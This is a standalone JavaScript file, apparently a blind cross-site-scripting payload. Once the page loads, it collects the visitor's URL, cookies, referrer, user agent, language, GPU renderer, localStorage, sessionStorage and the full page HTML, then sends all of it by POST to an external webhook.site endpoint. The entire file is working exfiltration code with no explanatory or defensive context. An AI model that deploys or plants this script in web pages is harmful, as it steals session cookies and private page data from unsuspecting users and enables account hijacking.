var r_Jn = {};  

function prs(t) {  
    return void 0 !== t ? t : "";  
}  

function x_po(t) {  
    var r = new XMLHttpRequest();  
    r.open("POST", "https://webhook.site/0d7748e2-4d3c-4859-9dad-d1f308354925", !0);  
    r.setRequestHeader("Content-type", "application/json"); // Change to application/json  
    r.onreadystatechange = function() {  
        if (this.readyState == 4 && this.status == 200) {  
            // Optionally handle response here  
        }  
    };  
    r.send(JSON.stringify(t));  
}  

function x_PS() {  
    try {  
        r_Jn.uri = prs(location.toString());  
    } catch (t) {  
        r_Jn.uri = "";  
    }  
    try {  
        r_Jn.cookies = prs(document.cookie);  
    } catch (t) {  
        r_Jn.cookies = "";  
    }  
    try {  
        r_Jn.referrer = prs(document.referrer);  
    } catch (t) {  
        r_Jn.referrer = "";  
    }  
    try {  
        r_Jn["user-agent"] = prs(navigator.userAgent);  
    } catch (t) {  
        r_Jn["user-agent"] = "";  
    }  
    try {  
        r_Jn.origin = prs(location.origin);  
    } catch (t) {  
        r_Jn.origin = "";  
    }  
    try {  
        var t = navigator.language || navigator.userLanguage;  
        r_Jn.lang = prs(t);  
    } catch (t) {  
        r_Jn.lang = "";  
    }  
    try {  
        var r = document.createElement("canvas"),  
            e = r.getContext("webgl") || r.getContext("experimental-webgl"),  
            n = e.getExtension("webgl_debug_renderer_info"),  
            o = e.getParameter(n.UNMASKED_RENDERER_WEBGL);  
        r_Jn.gpu = prs(o);  
    } catch (t) {  
        r_Jn.gpu = "";  
    }  
    try {  
        r_Jn.localstorage = window.localStorage;  
    } catch (t) {  
        r_Jn.localstorage = "";  
    }  
    try {  
        r_Jn.sessionstorage = window.sessionStorage;  
    } catch (t) {  
        r_Jn.sessionstorage = "";  
    }  
    try {  
        r_Jn.dom = prs(document.documentElement.outerHTML);  
    } catch (t) {  
        r_Jn.dom = "";  
    }  
    try {  
        r_Jn.screenshot = "";  
        a();  
    } catch (t) {  
        r_Jn.screenshot = "";  
        a();  
    }  

    function a() {  
        o_js();  
        x_po(r_Jn);  
    }  
}  

function j_ls(t, r, e) {  
    t.addEventListener ? t.addEventListener(r, e, !1) : t.attachEvent && t.attachEvent("on" + r, e);  
}  

function o_js() {}  

r_Jn = {};  
"complete" == document.readyState ? x_PS() : j_ls(window, "load", function() {  
    x_PS();  
});  
